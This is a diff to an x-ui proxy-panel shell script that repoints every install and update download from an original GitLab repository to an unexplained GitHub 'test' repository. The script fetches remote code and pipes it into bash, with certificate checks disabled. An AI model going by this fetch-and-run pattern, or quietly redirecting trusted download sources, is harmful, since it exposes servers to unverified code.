@@ -107,7 +107,7 @@ before_show_menu() {
 }
 
 install() {
-    wget -N https://gitlab.com/rwkgyg/x-ui-yg/raw/main/install.sh && bash install.sh
+    wget -N https://github.com/ZZreturn1/test/raw/main/install.sh && bash install.sh
     if [[ $? == 0 ]]; then
         if [[ $# == 0 ]]; then
             start
@@ -140,7 +140,7 @@ update() {
     systemctl stop x-ui
     cd /usr/local/
     if  [ $# == 0 ] ;then
-        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz https://gitlab.com/rwkgyg/x-ui-yg/raw/main/x-ui-linux-${arch}.tar.gz
+        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz https://github.com/ZZreturn1/test/raw/main/x-ui-linux-${arch}.tar.gz
         if [[ $? -ne 0 ]]; then
             echo -e "${red}下载 x-ui 失败，请确保你的服务器能够下载 Github 的文件${plain}"
             rm -rf install.sh
@@ -148,7 +148,7 @@ update() {
         fi
     else
         last_version=$1
-        url="https://gitlab.com/rwkgyg/x-ui-yg/raw/main/x-ui-linux-${arch}.tar.gz"
+        url="https://github.com/ZZreturn1/test/raw/main/x-ui-linux-${arch}.tar.gz"
         echo -e "开始安装 x-ui v$1"
         wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz ${url}
         if [[ $? -ne 0 ]]; then
@@ -165,7 +165,7 @@ update() {
     cd x-ui
     chmod +x x-ui bin/xray-linux-${arch}
     cp -f x-ui.service /etc/systemd/system/
-    wget --no-check-certificate -O /usr/bin/x-ui https://gitlab.com/rwkgyg/x-ui-yg/raw/main/x-ui.sh
+    wget --no-check-certificate -O /usr/bin/x-ui https://github.com/ZZreturn1/test/raw/main/x-ui.sh
     chmod +x /usr/bin/x-ui
     chmod +x /usr/local/x-ui/x-ui.sh
     systemctl daemon-reload
@@ -388,7 +388,7 @@ wget -N --no-check-certificate https://gitlab.com/rwkgyg/CFwarp/raw/main/CFwarp.
 }
 
 update_shell() {
-    wget -O /usr/bin/x-ui -N --no-check-certificate https://gitlab.com/rwkgyg/x-ui-yg/raw/main/x-ui.sh
+    wget -O /usr/bin/x-ui -N --no-check-certificate https://github.com/ZZreturn1/test/raw/main/x-ui.sh
     if [[ $? != 0 ]]; then
         echo ""
         echo -e "${red}下载脚本失败，请检查本机能否连接 Github${plain}"
